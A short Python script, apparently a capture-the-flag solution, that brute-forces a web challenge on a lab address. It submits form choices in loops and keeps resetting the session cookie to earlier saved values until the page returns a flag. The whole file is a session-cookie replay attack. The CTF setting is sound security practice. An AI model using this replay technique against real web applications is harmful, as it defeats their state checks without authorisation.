import requests, base64
url = "http://192.168.100.3:38108" #remove url[:-6] when not using vpn

def main():
    s = requests.session()
    headers={'Content-Type': 'application/x-www-form-urlencoded'}
    response = s.get(url)
    root_cookie = s.cookies['session']

    #print(s.cookies['session'])
    
    for a in range(1, 4):
        response = s.post(url=url, data=f'choice={a}', headers=headers)
        #print('a', a, s.cookies['session'])
        
        first_cookie = s.cookies['session']
        for b in range(1, 4):  
            response = s.post(url=url, data=f'choice={b}', headers=headers)
            #print('a', 'b', a, b, s.cookies['session'])
            
            second_cookie = s.cookies['session']
            for c in range(1, 4):
                response = s.post(url=url, data=f'choice={c}', headers=headers)
                #print('a', 'b', 'c', a, b, c, s.cookies['session'])
                
                if len(s.cookies['session']) > len(second_cookie):

                    for i in range(10):
                        cookie = s.cookies['session']
                        #print(i, cookie)
                        
                        for d in range(1, 4):
                            response = s.post(url=url, data=f'choice={d}', headers=headers)
                            
                            if len(s.cookies['session']) >= len(cookie):
                                break
                            else: 
                                s.cookies.set(domain=url[7:][:-6], path='/', name='session', value=cookie)
                    
                    if 'flag' in response.text:        
                        print(response.text)
                    else: print(':(')
                    
                    return
                
                s.cookies.set(domain=url[7:][:-6], path='/', name='session', value=second_cookie)
                
            s.cookies.set(domain=url[7:][:-6], path='/', name='session', value=first_cookie)
            
        
        s.cookies.set(domain=url[7:][:-6], path='/', name='session', value=root_cookie)


if __name__ == "__main__":
    main()